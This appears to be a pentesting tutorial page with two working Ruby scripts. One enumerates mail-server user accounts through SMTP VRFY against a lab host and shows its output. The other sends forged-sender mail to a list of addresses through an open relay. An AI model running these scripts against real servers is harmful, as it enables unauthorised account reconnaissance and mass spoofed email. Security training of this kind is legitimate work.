# SMTP email address enumeration

Interacting with SMTP is easy and since the protocol is straight forward.
We can use the [VRFY](https://book.hacktricks.xyz/pentesting/pentesting-smtp#vrfy) command to check if an email address exists or not:

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'socket'

users =
    %w{
        root rubyfu www apache2 bin daemon sshd
        gdm  nobody ftp operator postgres mysqld
      }
found = []

@s = TCPSocket.new('192.168.0.19', 25)
@banner = @s.recv(1024).chomp
users.each do |user|
  @s.send "VRFY #{user} \n\r", 0
  resp = @s.recv(1024).chomp
  found << user if resp.split[2] == user
end
@s.close

puts "[*] Result:-"
puts "[+] Banner: " + @banner
puts "[+] Found users: \n#{found.join("\n")}"
```

Results

```text
[*] Result:-
[+] Banner: 220 VulnApps.localdomain ESMTP Postfix
[+] Found users: 
root
rubyfu
www
bin
daemon
sshd
gdm
nobody
ftp
operator
postgres
```

**Your turn**, there are other commands that can be used such as [EXPN](https://book.hacktricks.xyz/pentesting/pentesting-smtp#expn), `RCPT`. Enhance the above script to include all these commands to avoid restricted commands that might you face. More SMTP commands are listed [here](https://book.hacktricks.xyz/pentesting/pentesting-smtp/smtp-commands).

# SMTP open relay abuse

SMTP not protected by authentication can be abused to send emails from anyone:

```ruby
#!/usr/bin/env ruby

require 'socket'

users = File.read('emails.txt').split("\n")

@s = TCPSocket.new('example.org', 25)
@banner = @s.recv(1024).chomp
users.each do |user|
  @s.send "MAIL from:noraj@example.org \n\r", 0
  @s.send "RCPT to:#{user} \n\r", 0
  @s.send "DATA \n\r", 0
  @s.send "email body here \r\n.\r\n", 0
  resp = @s.recv(1024).chomp
  puts resp
end
@s.close

puts "[*] Result:-"
puts "[+] Banner: " + @banner
```
